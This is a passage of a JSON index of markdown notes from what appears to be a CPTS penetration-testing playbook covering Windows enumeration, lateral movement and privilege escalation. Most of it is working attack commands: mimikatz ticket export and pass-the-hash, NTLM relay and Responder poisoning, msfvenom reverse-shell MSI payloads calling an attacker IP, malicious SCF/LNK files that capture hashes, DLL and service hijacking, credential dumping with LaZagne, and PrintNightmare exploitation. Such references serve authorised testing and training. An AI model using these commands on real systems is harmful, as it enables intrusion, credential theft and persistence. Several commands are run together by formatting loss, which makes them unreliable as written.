HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin` | Confirms if UAC is enabled and, if so, at what level. |\n| `netsh firewall show state\nnetsh firewall show config` | Displays firewall state and configuration. |",
    "headings": [
      {
        "level": 1,
        "text": "Windows Enumeration"
      },
      {
        "level": 2,
        "text": "Users & Groups"
      },
      {
        "level": 2,
        "text": "Operating System & Architecture"
      },
      {
        "level": 2,
        "text": "Network"
      },
      {
        "level": 2,
        "text": "Processes & Programs"
      },
      {
        "level": 2,
        "text": "Security"
      }
    ],
    "commands": [],
    "tags": [
      "winpeas",
      "lateral movement"
    ],
    "size": 3880,
    "lineCount": 93
  },
  {
    "id": "cpts-playbook-procedures-windows-enumeration-privesc-2f0f5174ff0280558116e98bd3bbece6",
    "title": "Windows Enumeration & PrivEsc",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Procedures",
    "filePath": "CPTS Playbook/Procedures/Windows Enumeration & PrivEsc 2f0f5174ff0280558116e98bd3bbece6.md",
    "content": "# Windows Enumeration & PrivEsc\n\n# **Enumeration**\n\n- Enumerate users and groups\n    - [ ]  List local users\n    - [ ]  List local groups\n    - Check membership of interesting groups\n        - [ ]  Local Administrator\n        - [ ]  Remote Desktop Users (RDP access)\n        - [ ]  Remote Management Users (WinRM access)\n- Enumerate operating system information\n    - [ ]  Windows version and [build number](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)\n    - [ ]  Architecture (32 or 64 bit)\n- Enumerate network information\n    - [ ]  IP addresses and network interfaces\n    - [ ]  List active connections and listening ports\n- Enumerate program and processes information\n    - [ ]  List all installed applications and services\n    - [ ]  Look at processes for any running applications that are not installed\n- [ ]  Enumerate security features\n\n# **Privilege Escalation**\n\n# **Global**\n\n- [ ]  Try [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)\n- Look for vulnerable services\n    - [ ]  Services with weak executable permissions\n    - [ ]  Services where we can alter the executable path\n    - [ ]  Unquoted service paths\n    - [ ]  Services prone to DLL hijacking\n- [ ]  Check if `AlwaysInstallElevated` is enabled.\n- [ ]  Search for CVEs in installed programs.\n- [ ]  See if there are known exploits for the Windows version.\n\n# **Per User**\n\n- [ ]  Check user’s privileges\n- [ ]  Check which groups user belongs to\n- [ ]  Look for secrets in shell environment variables\n- [ ]  Hunt for credentials\n- [ ]  Look for Unquoted Service Paths\n- [ ]  Look for exploitable Scheduled Tasks\n- [ ]  Try planting malicious SCF and LINK files on writeable SMB shares.\n\n# **After Administrator**\n\n- Dump secrets\n    - [ ]  Get credentials using LaZagne\n    - [ ]  Dump SAM & LSA\n    - [ ]  Dump LSASS memory\n    - [ ]  Dump `NTDS.dit` (if Domain Controller)",
    "headings": [
      {
        "level": 1,
        "text": "Windows Enumeration & PrivEsc"
      },
      {
        "level": 1,
        "text": "Enumeration"
      },
      {
        "level": 1,
        "text": "Privilege Escalation"
      },
      {
        "level": 1,
        "text": "Global"
      },
      {
        "level": 1,
        "text": "Per User"
      },
      {
        "level": 1,
        "text": "After Administrator"
      }
    ],
    "commands": [],
    "tags": [
      "winrm",
      "winpeas",
      "smb",
      "privesc"
    ],
    "size": 1895,
    "lineCount": 53
  },
  {
    "id": "cpts-playbook-lateral-movement-windows-lateral-movement-2edf5174ff0280349569f916a8151f23",
    "title": "Windows Lateral Movement",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Lateral Movement",
    "filePath": "CPTS Playbook/Lateral Movement/Windows Lateral Movement 2edf5174ff0280349569f916a8151f23.md",
    "content": "# Windows Lateral Movement\n\n# **Kerberos Pass-the-Ticket**\n\nKerberos Pass-the-Ticket (PtT) is a post-exploitation technique to impersonate users by injecting valid Kerberos tickets (TGT or TGS) into a session. Rather than stealing plaintext credentials or NTLM hashes, PtT allows lateral movement and privilege escalation by reusing authentication tokens extracted from memory (e.g., via LSASS).\n\nThis technique exploits the trust inherent in Kerberos authentication and is particularly powerful in environments where credential hygiene is poor or ticket lifetimes are long.\n\n> When using a tool from Linux, verify whether it supports Kerberos ticket-based authentication. Typically, this involves setting the `KRB5CCNAME` environment variable to point to a `.ccache` ticket file.\n> \n\n| **Action** | **Description** |\n| --- | --- |\n| Export tickets:\n`.\\mimikatz.exeprivilege::debugsekurlsa::tickets /export`\n\nCheck the ticket files created:\n`dir *.kirbi` | Extracts Kerberos tickets from memory and saves them as `.kirbi` files.\n\nThe tickets are dumped from LSASS memory, so administrative privileges are required. |\n| Inject ticket:\n`.\\mimikatz.exeprivilege::debugkerberos::ptt <ticket-filename>.kirbi`\n\nCheck if the ticket was injected:\n`klist` | Loads a Kerberos ticket into memory for the current session (Pass-the-Ticket). |\n\n# **LLMNR & NBT-NS Poisoning**\n\n| **Action** | **Description** |\n| --- | --- |\n| `sudo responder -I <network-interface>` | (Linux) Launches [Responder](https://github.com/lgandx/Responder) with default settings. Output is shown in the terminal and saved to `/usr/share/responder/logs`. |\n| `.\\Inveigh.exe`\n\nUseful commands:\n\n`GET NTLMV2UNIQUEGET NTLMV2USERNAMES` | (Windows) Runs the C# version of [Inveigh](https://github.com/Kevin-Robertson/Inveigh). Requires transferring or compiling the executable.\n\nCommand help is available by pressing ESC and typing `HELP`. |\n| `Import-Module .\\Inveigh.ps1Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | (Windows) Uses the PowerShell version of [Inveigh](https://github.com/Kevin-Robertson/Inveigh).\n\nEasier to set up, but considered legacy and less flexible than the compiled version. |\n| `dir \\\\<attack-ip>\\test.txt` | (Windows) With code execution as a user (but without knowing the password), we can force the system to authenticate to us, steal the hash and crack it offline. |\n\n> Responder and Inveigh need `Super User` and `Administrator` privileges respectively. LLMNR operates over UDP port 5355, while NBT-NS uses UDP port 137.\n> \n\n# **NTLM Pass-the-Hash**\n\nTo use Pass-the-Hash (PtH) for lateral movement, the following conditions must be met:\n\n- The authenticating user must have local administrator rights on the target system.\n- The `ADMIN$` administrative SMB share must be available and accessible.\n- File and Printer Sharing must be enabled, and the SMB service (typically TCP port 445) must be reachable.\n\n| **Action** | **Description** |\n| --- | --- |\n| `nxc ... -H <ntlm-hash>\n\nevil-winrm ... -H <ntlm-hash>\n\nxfreerdp ... /pth:<ntlm-hash>\n\nsmbclient ... --pw-nt-hash <ntlm-hash>\n\nimpacket-wmiexec -hashes :<ntlm-hash>` | These are some of the tools with PtH support. |\n| `mimikatz.exe privilege::debug \"sekurlsa::pth /user:<user> /ntlm:<ntlm-hash> /domain:<domain>\" /run:powershell` | NTLM PtH attack from Windows using Mimikatz. Grants a shell. |\n| `reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enables Pass-the-Hash over RDP via Restricted Admin Mode, but requires admin rights on the target to work. |\n\n# PsExec\n\nTo use PsExec for lateral movement, the following conditions must be met:\n\n- The authenticating user must be a local administrator on the target.\n- The `ADMIN$` SMB share must be available.\n- File and Printer Sharing must be enabled.\n\n> Make sure to accept the EULA by running `PsExec64.exe -accepteula`, otherwise you can’t use the utility.\n> \n\n| **Action** | **Description** |\n| --- | --- |\n| `impacket-psexec <user>:'<pass>'@<target> \"<cmd>\"` | **Linux**: Executes commands remotely on a target using PsExec with provided credentials. |\n| `.\\PsExec64.exe -i \\\\<target> -u <domain>\\<user >-p <password> cmd` | **Windows**: Creates an interactive shell session on the remote host using PsExec. |\n\n> Since SysInternals suite isn’t installed on Windows hosts by default, we may need to transfer PsExec to our attacking Windows host. `PsExec.exe` can be download [here](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec).\n> \n\n# **SMB Net-NTLM Relay**\n\n**For this attack to work, the SMB service on the target machine must have SMB signing disabled.** SMB signing is a security feature that ensures the authenticity and integrity of SMB messages, preventing tampering or relaying by requiring cryptographic verification.\n\n**Additionally, we want the user whose credentials are being relayed to have administrative privileges on the target machine,** as this level of access is required to execute code remotely via the SMB protocol.\n\n**And lastly, there’s a limitation where NTLM hashes can’t be relayed back to the same machine they originated from, meaning the relay target must be a different host.**\n\n| **Action** | **Description** |\n| --- | --- |\n| `nxc smb <relay-target>\n\nsudo nmap --script=smb2-security-mode.nse -p445 <relay-target>` | For the attack to work, the relay target must have SMB signing disabled or not enforced. |\n| `impacket-ntlmrelayx --no-http-server -smb2support -t <relay-target> -c \"<payload>\"` | This sets up an SMB server that captures and relays NTLM hashes to the target and automatically executes the specified payload.\n\nNo need to run Responder alongside. |\n\n# **WMI (Windows Management Instrumentation)**\n\nTo use WMI remotely, the user must be a member of the **local Administrators** group on the target machine.\n\n| **Action** | **Description** |\n| --- | --- |\n| `impacket-wmiexec <user>:\"<password>\"@<target> \"<system command>\"` | **Linux**: Executes commands remotely on a target using WMI over DCOM with provided credentials. |\n| Create a credential:\n`$user = '<username>';\n$pass = '<password>';\n$secureString = ConvertTo-SecureString $pass -AsPlaintext -Force;\n$cred = New-Object System.Management.Automation.PSCredential $user, $secureString;`\n\nCreate a CIM session:\n`$options = New-CimSessionOption -Protocol DCOM\n$session = New-Cimsession -ComputerName <target> -Credential $cred -SessionOption $options\n$command = '<command>';`\n\nInvoke:`Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};` | **Windows**: Creates a WMI session using CIM over DCOM and runs a command on the remote host. |\n\n# WinRM (Windows Remote Management)\n\nTo use WinRM, the user must belong to either the **local Administrators** group or the **Remote Management Users** group on the target system.\n\n| **Action** | **Description** |\n| --- | --- |\n| `evil-winrm -i <target> -u <user> -p <password>` | **Linux**: Opens an interactive WinRM shell on the target using provided credential |\n| `nxc winrm <target-ip> -u <user> -p <password>` | **Linux**: Executes commands on a remote host over WinRM with given credentials. |\n| `Test-WSMan -ComputerName <target>` | **Windows**: Tests connectivity to the WinRM service on the target machine. |\n| `winrs -r:<target> -u:<username> -p:<password> \"cmd /c <command>\"`\n\nFor PowerShell payloads:\n`\"powershell -nop -w hidden -c '<command>'\"` | **Windows**: Runs commands remotely over WinRM. |\n| Create a credential:\n`$user = '<username>';\n$pass = '<password>';\n$secureString = ConvertTo-SecureString $pass -AsPlaintext -Force;\n$cred = New-Object System.Management.Automation.PSCredential $user, $secureString;`\n\nCreate a WinRM session:\n`New-PSSession -ComputerName <target> -Credential $cred;`\n\nEnter the session:\n`Enter-PSSession <session-id>` | **Windows**: Establishes and enters a remote PowerShell session over WinRM securely. |",
    "headings": [
      {
        "level": 1,
        "text": "Windows Lateral Movement"
      },
      {
        "level": 1,
        "text": "Kerberos Pass-the-Ticket"
      },
      {
        "level": 1,
        "text": "LLMNR & NBT-NS Poisoning"
      },
      {
        "level": 1,
        "text": "NTLM Pass-the-Hash"
      },
      {
        "level": 1,
        "text": "PsExec"
      },
      {
        "level": 1,
        "text": "SMB Net-NTLM Relay"
      },
      {
        "level": 1,
        "text": "WMI (Windows Management Instrumentation)"
      },
      {
        "level": 1,
        "text": "WinRM (Windows Remote Management)"
      }
    ],
    "commands": [],
    "tags": [
      "nmap",
      "mimikatz",
      "impacket",
      "psexec",
      "winrm",
      "pass-the-ticket",
      "pass-the-hash",
      "smb",
      "kerberos",
      "rce",
      "lateral movement",
      "sudo"
    ],
    "size": 7980,
    "lineCount": 148
  },
  {
    "id": "cpts-playbook-post-exploitation-windows-windows-privesc-2e9f5174ff028051b559c736a8e81bed",
    "title": "Windows PrivEsc",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation / Windows",
    "filePath": "CPTS Playbook/Post Exploitation/Windows/Windows PrivEsc 2e9f5174ff028051b559c736a8e81bed.md",
    "content": "# Windows PrivEsc\n\n[Privileged Group](Windows%20PrivEsc/Privileged%20Group%202e9f5174ff0280ffa69cd238e806c2c5.md)\n\n[Secrets Dumping](Windows%20PrivEsc/Secrets%20Dumping%202eaf5174ff0280639c1eeba5a7b7453a.md)\n\n[User Privileges](Windows%20PrivEsc/User%20Privileges%202eaf5174ff0280f592d0c2932323b32a.md)\n\n## **AlwaysInstallElevated**\n\n**`AlwaysInstallElevated` is a Windows misconfiguration that allows a standard user to run Microsoft Installer (`.msi`) packages with SYSTEM-level privileges.** This occurs when Group Policy is configured to permit elevated installations for all users.\n\nTwo specific keys control whether `.msi` packages can be installed with elevated privileges:\n\n- `HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`\n- `HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`\n\nIf **both** of these registry keys are set to `1`, any user can install a malicious `.msi` package that will run with SYSTEM privileges.\n\n| **Action** | **Description** |\n| --- | --- |\n| `reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\n\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer` | Check if both registry keys are set to `0x1` (enabled) for `AlwaysInstallElevated`. |\n| Revere shell:\n`msfvenom -p windows/shell_reverse_tcp lhost=<attacker-ip> lport=<port> -f msi > shell.msi`\n\nRun arbitrary command:\n`msfvenom -p windows/x64/exec cmd='<command>' -f msi -o rce.msi` | Generate a malicious `.msi` file to get a reverse shell or run a custom command. |\n| `msiexec /i <file-path>.msi /quiet /qn /norestart` | Execute the payload with elevated privileges. |\n\n## **DLL Hijacking**\n\n| **Action** | **Description** |\n| --- | --- |\n| Open filters window:\n`Filter` -> `Filter...`\n\nAdd the following filters:\n1. `Process Name` contains `<program-name>` then `include`\n2. `Operation` is `CreateFile` then `include`\n3. `Path` ends with `.dll` then `include`\n\nThen run the program so `ProcMon` can monitor it. | Transfer the executable to your own Windows machine and open [ProcMon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) as administrator.\n\nWe’ll monitor `CreateFile` operations, which occur when programs create or open files. |\n| Add a filter to capture failed file handle attempts, where the executable tries but fails to open a DLL file:`Result` is `NAME NOT FOUND` then `include`\n\nSave the capture as a CSV file, then use the [Python script below](https://field-manual.brunorochamoura.com/manual/post-exploitation/windows-post-exploitation/windows-privilege-escalation/dll-hijacking/#missing-dlls-script) to identify potentially hijackable DLLs:\n`python3 dll-hijack.py <procmon-log> \"<executable-path>\" \"<%PATH%>\"`\n\nCheck if we can write to one of the directories:\n`echo \"BRM\" > '<directory>\\BRM.md'type '<directory>\\BRM.md'`\n\nIf writable, replace the DLL:\n`move \"<original-dll>\" .\nmove \"<evil-dll>\" \"<original-dll>\"` | **Missing DLL Load**: If a program tries to load a missing DLL, we can hijack it by placing a malicious DLL with the same name in a searched directory.\n\nThis also applies if we can write to a directory that is searched before the location where the DLL is eventually found.\n\nThe payload will execute when the program loads the DLL. |\n| Identify DLLs loaded by the program and check if it’s writable:\n`icacls <target-dll>`\n\nIf yes, replace it with a malicious one:\n`move \"<target-dll>\" .\nmove \"<evil-dll>\" \"<target-dll>\"` | **DLL Replacement**: If an existing DLL is loaded by the program and is writable, replace it with a malicious version.\n\nThe payload will execute when the program loads the DLL. |\n| Replace `cscapi.dll` with a malicious payload:\n\n`move \"C:\\Windows\\cscapi.dll\" <backup-dir>\nmove \"<evil-dll>\" \"C:\\Windows\\cscapi.dll\"` | **Explorer.exe Persistence**: After gaining administrator access, achieve elevated persistence by hijacking one of Explorer’s DLLs.\n\nEach time Explorer is opened, the payload will execute.Possible targets include `cscapi.dll`, among others DLLs. |\n\n> It’s unlikely we’ll independently discover a zero-day in a third-party program during an engagement. Instead, research online for any public information about known DLL hijacking vulnerabilities in the installed programs.\n> \n\nCheck Out: https://field-manual.brunorochamoura.com/manual/post-exploitation/windows-post-exploitation/windows-privilege-escalation/dll-hijacking/\n\n## **Malicious SCF and LNK Files**\n\n| **Action** | **Description** |\n| --- | --- |\n| `[Shell]\nCommand=2\nIconFile=\\\\ATTACK-IP\\share\\BRM.ico\n[Taskbar]\nCommand=ToggleDesktop` | **SCF**: We can create the file by renaming a text file to `.scf` and adding the specified content.\n\nMake sure to change the IP and the remote resource (which doesn’t need to truly exist). |\n| `$objShell = New-Object -ComObject WScript.Shell\n\n$lnk = $objShell.CreateShortcut(\"<share-location>\\BRM.lnk\")\n\n$lnk.TargetPath = \"\\\\<attacker-ip>\\@BRM.png\"\n\n$lnk.WindowStyle = 1\n\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n\n$lnk.Description = \"Browsing to the directory where this file is saved will trigger an auth request.\"\n\n$lnk.HotKey = \"Ctrl+Alt+O\"$lnk.Save()` | **LNK**: Uses PowerShell to create a malicious `.LNK` file on a Windows machine.\n\nModify `TargetPath`, `Description`, attacker IP, and filename to suit the attack scenario. |\n| [LLMNR & NBT-NS Poisoning](https://field-manual.brunorochamoura.com/manual/lateral-movement/windows-lateral-movement/llmnr--nbt-ns-poisoning/) | Have a network poisoning tool like Responder or Inveigh ready to intercept authentication attempts when a user views the file, capturing NTLM hashes. |\n\n> The SCF technique no longer works on Server 2019 and later, but the .LNK technique still does.\n> \n\n## **Scheduled Task Abuse**\n\n| **Action** | **Description** |\n| --- | --- |\n| Run the scanner script:\n`powershell.exe -ExecutionPolicy Bypass.\\tasks-scanner.ps1`\n\nGet more information about the potentially vulnerable task(s):\n`$task = Get-ScheduledTask -TaskName \"<task>\"`\n\nThe task name:\n`$task.TaskName`\n\nIts security context:\n`$task.Principal.UserId`\n\nIts actions:\n`$task.Actions`\n\nIts triggers:\n`$task.Triggers | ForEach-Object { $_ | Format-List * }` | Use the scheduled task scanner script at the bottom of this article to identify potential targets.\n\nThen, retrieve details like the task name, security context, actions, and triggers to assess vulnerability. |\n| Check if we have write permissions:\n`icacls <task-executable-path>`\n\nReplace the executable for our malicious payload:\n`move \"<service-exe>\" .move “<evil-exe>” \"<service-exe>\"` | If a scheduled task runs an executable that we have write permissions over, we can replace it.\n\nThe next time the tasks is ran, our payload will be executed. |\n| Check if we have write permissions:\n`icacls <task-directory-path>`\n\nIf so, follow: [DLL Hijacking](https://field-manual.brunorochamoura.com/manual/post-exploitation/windows-post-exploitation/windows-privilege-escalation/dll-hijacking/) | If we cannot replace an executable but we can write in it’s directory, we may be able to hijack a DLL.\n\nIf so, the next time the tasks is ran, our payload will be executed. |\n\n## **Unquoted Service Paths**\n\n> Although unquoted service paths only need to be discovered once per machine, exploitation depends on whether the current user has write permissions to an earlier directory in the path.\n> \n\n| **Action** | **Description** |\n| --- | --- |\n| `powershell.exe -ExecutionPolicy Bypass. .\\PowerUp.ps1Get-UnquotedService` | Loads [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) to enumerate service with unquoted paths.\n\nPay attention to the `CanRestart` field.\n\nIdentify executable search order using this [Python script](https://field-manual.brunorochamoura.com/manual/post-exploitation/windows-post-exploitation/windows-privilege-escalation/unquoted-service-paths/#executable-search-order-script). |\n| `icacls \"<path>\"mv <malicious-exe> <executable-path>Start-Service <service>` | Test write permissions on each directory in the search order.\n\nIf we find a writable directory, plant our malicious executable there and start the service.\n\nIt’s possible that an error might occur due to incompatible parameters in the service path, but the command should still execute successfully. |\n| Check if `StartMode` is `Auto`:\n`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service-name>'}`\n\nCheck if the user has `SeShutDownPrivilege` assigned:\n`whoami /priv`\n\nReboot machine to trigger the payload:\n`shutdown /r /t 0` | If we do not have the permissions to start the service and trigger our payload, we can still exploit it if it starts automatically at boot and if we can reboot the system. |\n\n## **VMDK, VHD and VHDX files**\n\n| **Action** | **Description** |\n| --- | --- |\n| `where /R C:\\ *.vmdk *.vhd *.vhdx` | Search recursively for virtual disk files on Windows targets. |\n| `guestmount -a <file>.vmdk -i --ro /mnt/vmdk` | Mount a VMDK file on Linux. |\n| `guestmount --add <file>.vhdx --ro /mnt/vhdx/ -m /dev/sda1` | Mount a VHD/VHDX file on Linux. |\n| `Mount-VHD -Path <file>.vhdx` | Mount VHD/VHDX on Windows using PowerShell.If we have GUI access, right-click the file or use Disk Management. The disk will appear as a browsable drive. |\n\n## **Weak Service Permissions**\n\n| **Action** | **Description** |\n| --- | --- |\n| `powershell.exe -ExecutionPolicy Bypass. .\\PowerUp.ps1` | Loads [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) to enumerate improper service permissions. |\n| `Get-ModifiableServiceFile`\n\nReplace the executable for our malicious payload:\n`move \"<service-exe>\" .move “<evil-exe>” \"<service-exe>\"`\n\nRestart the service if we can:`sc.exe stop <service-name>sc.exe start <service-name>` | If we have write permissions over a service’s executable, we can replace it with a malicious `.exe` payload.\n\nPay attention to `ModifiableFile` and `CanRestart`.\n\nIf the modifiable file is `C:\\`, it’s likely a false positive. |\n| `Get-ModifiableService`\n\nReplace `binPath`:\n`sc.exe config <service-name> binpath=\"cmd /c <payload>\"`\n\nRestart the service if we can:\n`sc.exe stop <service-name>sc.exe start <service-name>` | If we have permissions to modify a service’s `binPath`, we can make it execute a malicious `cmd` payload. |\n| Check the `Writable Directory Scanner` script at the bottom of this article.\n\nIf a writable directory is found, follow:\n[DLL Hijacking](https://field-manual.brunorochamoura.com/manual/post-exploitation/windows-post-exploitation/windows-privilege-escalation/dll-hijacking/) | If we can’t replace an executable file but can write to its directory, it may be possible to hijack a DLL used by the executable. |\n| Check if `StartMode` is `Auto`:\n`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service-name>'}`\n\nCheck if the user has `SeShutDownPrivilege` assigned:\n`whoami /priv`\n\nReboot machine to trigger the payload:\n`shutdown /r /t 0` | If we can tamper with a service but do not have the permissions to restart it, we can still exploit it if it starts automatically at boot and if we can reboot the system. |\n\n## **Windows Credential Hunting**\n\n| **Action** | **Description** |\n| --- | --- |\n| `.\\lazagne.exe all` | Use [LaZagne](https://github.com/AlessandroZ/LaZagne) to dump stored credentials for known applications. |\n| `where /R C:\\ *.kdbx` | Locate KeePass databases. \n\nIf found, attempt to crack them. |\n| `cmdkey /list\n\nrunas /savecred /user:<user> \"<payload>\"` | Lists stored credentials and uses saved ones to run commands under another user’s context.\n\nIf allowed, we can use the RDP client to authenticate as that user to another machine. |\n| `type (Get-PSReadLineOption).HistorySavePath` | Reads current user’s PowerShell history.\n\nMay contain credentials or interesting commands. |\n| `reg query HKEY_CURRENT_USER\\SOFTWARE\\<user>\\PuTTY\\Sessions\n\nreg query <key>` | Dumps PuTTY session info from registry.\n\nMay contain plaintext credentials or saved sessions. |\n| `dir C:\\Users\\<user>\\AppData\\Roaming\\mRemoteNG`\n\nUse [mRemoteNG Decryptor](https://github.com/haseebT/mRemoteNG-Decrypt) to extract credentials from config files:\n`python3 mremoteng_decrypt.py -s \"<ecrypted-password-string>\"`\n\nIf the password is unknown, bruteforce using a wordlist:\n`for password in $(cat /<wordlist>);do echo $password; python3 mremoteng_decrypt.py -s \"<encrypted-password-string>\" -p $password 2>/dev/null;done` | Look for `confCons.xml` in `mRemoteNG`, which contains encrypted credentials. |\n| Look for the three SQL files with name `plum.sqlite*`:\n`dir C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState`\n\nCopy these three files to your attack host and open SQLite database browser:\n`SELECT Text FROM Note;`\n\nIf you want to read the database directly from on the host, you’ll need the [PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite) Powershell module:\n`Import-Module .\\PSSQLite.psd1\n$db = <plum.sqlite-path>\nInvoke-SqliteQuery -Database $db -Query \"SELECT Text FROM Note\" | ft -wrap` | Sticky Notes data is stored in a local SQLite DB.\n\nUsers often save passwords or sensitive info here without realizing it’s easily readable. |\n| This all must be executed from the context of the owner of the file:\n`$credential = Import-Clixml -Path '<pass.xml-path>'`\n\nDisplay username:\n`$credential.GetNetworkCredential().username`\n\nDisplay plaintext password:\n`$credential.GetNetworkCredential().password` | PowerShell credentials used in scripts and automation are encrypted with DPAPI, meaning they can only be decrypted by the same user on the same computer.\n\nIf you find one within a script, we can decrypt it if we have command execution rights as the file’s owner. |\n| `Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue` | Recursively searches for documents that might contain credentials or sensitive info in user profiles. |\n\n## **Windows PrivEsc Payloads**\n\n| **Action** | **Description** |\n| --- | --- |\n| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <ext> -o shell.<ext>` | Generates a Windows x64 reverse TCP shell payload. |\n| As a command:\n`net localgroup Administrators <user> /add`\n\nAs an executable:\n`msfvenom -p windows/x64/exec cmd='net localgroup Administrators <user> /add' -f <ext> -o add_user.<ext>` | Adds an existing user to the local administrator group. |\n| As a command:\n`net group \"domain admins\" <user> /add /domain`\n\nAs an executable:\n`msfvenom -p windows/x64/exec cmd='net group \"domain admins\" <user> /add /domain' -f <ext> -o add_user.<ext>` | Adds an existing user to the domain administrator group. |\n| As a command:\n`net group \"Remote Desktop Users\" <user> /addnet group \"Remote Management Users\" <user> /add`\n\nAs an executable:\n`msfvenom -p windows/x64/exec cmd='net group \"Remote Desktop Users\" <user> /add' -f <ext> -o add_user_rdp.<ext>\n\nmsfvenom -p windows/x64/exec cmd='net group \"Remote Management Users\" <user> /add' -f <ext> -o add_user_winrm.<ext>` | Grants an existing user RDP and WinRM rights by adding it to the corresponding groups.\n\nBe sure to add `/domain` if it’s a domain user, and not local. |\n| As a command:\n`net user <username> <password> /add`\n\nAs an executable:\n`msfvenom -p windows/x64/exec cmd='net user <username> <password> /add' -f <ext> -o add_user.<ext>` | Creates a new user.Adding this user to high-privilege groups can provide an alternative to reverse shells if they are causing issues. |\n| `.\\PsExec.exe -s cmd.exe /c \"<command>\"` | From a local administrator context, executes a command as `SYSTEM`.\n\nBe sure to use `-accepteula` before using PsExec. |\n\n## **Windows Version Exploits**\n\n| **Action** | **Description** |\n| --- | --- |\n| Establish a meterpreter shell, background it and launch the following module:\n`post/multi/recon/local_exploit_suggester` | The best method I know for automatically scanning for local privilege escalation is through a Metasploit Framework module.\n\nIt performs local exploit checks, but does not exploit anything without your input. |\n| Firstly, update the DB for new exploits:\n`wes --update`\n\nRun `systeminfo` on the Windows host and copy it to a file in our attack machine.\n\nRun WES with the `systeminfo` output as an argument.\n`wes systeminfo.txt --color`\n\nGrep for “Elevation of Privilege”. | Alternatively, we can use the [Windows Exploit Suggester](https://github.com/bitsadmin/wesng) tool locally.\n\nThis is not as good as the MSF module, but is stealthier and the work is done on our attack machine. |\n| — | The [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) script has Watson embedded, a tool that enumerates missing KBs and suggest privilege escalation exploits. |\n\n### **Notable Exploits**\n\n| **Action** | **Description** | **Version** |\n| --- | --- | --- |\n| Check if the Print Spooler service is active by listing the named pipe.\nA “path does not exist” error means it’s not running:\n`ls \\\\localhost\\pipe\\spoolss`\n\nYou can also use check this from the Linux attack host.If the output contains `MS-RPRN` or `MS-PAR`, then it’s likely vulnerable:\n`impacket-rpcdump @<target-ip> | egrep 'MS-RPRN|MS-PAR'`\n\nDownload, import and run the [exploit](https://github.com/calebstewart/CVE-2021-1675).\n`Set-ExecutionPolicy Bypass -Scope Process\n\nImport-Module .\\CVE-2021-1675.ps1\n\nInvoke-Nightmare -NewUser \"<username>\" -NewPassword \"<password>\" -DriverName \"PrintIt\"`\n\nConfirm that the user is now a local administrator.\n`net user <username>` | **PrintNightmare**: Exploits the Print Spooler service to load malicious printer drivers and execute arbitrary code as `SYSTEM`, locally or remotely.Read more about this attack [here](https://www.docusnap.com/en/it-documentation/windows-printnightmare-vulnerability). | Potentially all Windows versions |\n| [https://github.com/WiredPulse/Invoke-HiveNightmare](https://github.com/WiredPulse/Invoke-HiveNightmare) | **SeriousSAM / HiveNightmare**: Abuses overly permissive access on shadow copies to read sensitive registry hives (`SAM`, `SYSTEM`, `SECURITY`) as a user. | Windows 10 version 1809 or newer |",
    "headings": [
      {
        "level": 1,
        "text": "Windows PrivEsc"
      },
      {
        "level": 2,
        "text": "AlwaysInstallElevated"
      },
      {
        "level": 2,
        "text": "DLL Hijacking"
      },
      {
        "level": 2,
        "text": "Malicious SCF and LNK Files"
      },
      {
        "level": 2,
        "text": "Scheduled Task Abuse"
      },
      {
        "level": 2,
        "text": "Unquoted Service Paths"
      },
      {
        "level": 2,
        "text": "VMDK, VHD and VHDX files"
      },
      {
        "level": 2,
        "text": "Weak Service Permissions"
      },
      {
        "level": 2,
        "text": "Windows Credential Hunting"
      },
      {
        "level": 2,
        "text": "Windows PrivEsc Payloads"
      },
      {
        "level": 2,
        "text": "Windows Version Exploits"
      },
      {
        "level": 3,
        "text": "Notable Exploits"
      }
    ],
    "commands": [],
    "tags": [
      "impacket",
      "psexec",
      "winrm",
      "winpeas",
      "sqli",
      "rce",
      "privesc",
      "persistence"
    ],
    "size": 18378,
    "lineCount": 346
  },
  {
    "id": "readme",
    "title": "README",
    "category": "General Methodologies",
    "filePath": "README.md",
